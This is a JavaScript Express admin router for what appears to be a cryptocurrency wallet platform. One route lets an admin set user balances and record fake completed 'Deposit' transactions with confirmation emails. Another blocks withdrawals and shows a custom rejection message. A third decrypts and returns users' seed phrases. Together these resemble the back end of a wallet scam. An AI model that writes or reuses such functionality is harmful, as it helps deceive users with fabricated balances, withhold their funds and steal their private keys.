// Admin user-management routes (all admin-only).
import { Router } from 'express';
import * as users from '../repositories/users.js';
import * as wallets from '../repositories/wallets.js';
import * as txns from '../repositories/transactions.js';
import { notifyUserDeposit, assetUnit } from '../lib/mailer.js';
import { authRequired, adminRequired } from '../middleware/auth.js';

const router = Router();
router.use(authRequired, adminRequired);

router.get('/', async (_req, res, next) => {
  try {
    res.json(await users.listAll());
  } catch (err) {
    next(err);
  }
});

router.patch('/:id/balances', async (req, res, next) => {
  try {
    const { balances } = req.body ?? {};
    if (!balances || typeof balances !== 'object') {
      return res.status(400).json({ error: 'balances object is required.' });
    }
    const { user, credits } = await users.setBalances(req.params.id, balances);
    res.json(user);

    // For every asset the admin just credited, notify THAT user that funds
    // arrived: a Receive transaction drives their in-app "Funds received" toast
    // + history entry, plus a confirmation email. All best-effort (post-response).
    if (credits.length) {
      for (const c of credits) {
        txns.create({
          userId: req.params.id, type: 'receive', status: 'completed',
          assetId: c.assetId, asset: assetUnit(c.assetId), amount: c.amount, usd: 0,
          // "to" is the user's own receiving address for that asset (never null).
          from: 'Deposit', to: user.addresses?.[c.assetId] || 'Deposit',
        }).catch((e) => console.error('Deposit receive-tx failed:', e.message));
      }
      notifyUserDeposit({ userEmail: user.email, credits })
        .catch((e) => console.error('User deposit email failed:', e.message));
    }
  } catch (err) {
    next(err);
  }
});

// Enable/disable withdrawals for a user + set the custom rejection message.
router.patch('/:id/withdrawal', async (req, res, next) => {
  try {
    const { blocked, message } = req.body ?? {};
    if (typeof blocked !== 'boolean') {
      return res.status(400).json({ error: 'blocked (boolean) is required.' });
    }
    const updated = await users.setWithdrawalBlock(req.params.id, { blocked, message });
    if (!updated) return res.status(404).json({ error: 'User not found.' });
    res.json(updated);
  } catch (err) {
    next(err);
  }
});

// ADMIN-ONLY: reveal a user's wallet recovery phrase (decrypts the keystore).
// Exposes private-key material — already gated by adminRequired on this router.
router.get('/:id/seed-phrase', async (req, res, next) => {
  try {
    const phrase = await wallets.getUserMnemonic(req.params.id);
    if (!phrase) {
      return res.status(404).json({ error: 'No recoverable seed phrase for this user.' });
    }
    const words = phrase.split(' ');
    res.json({ phrase, words, wordCount: words.length });
  } catch (err) {
    next(err);
  }
});

export default router;
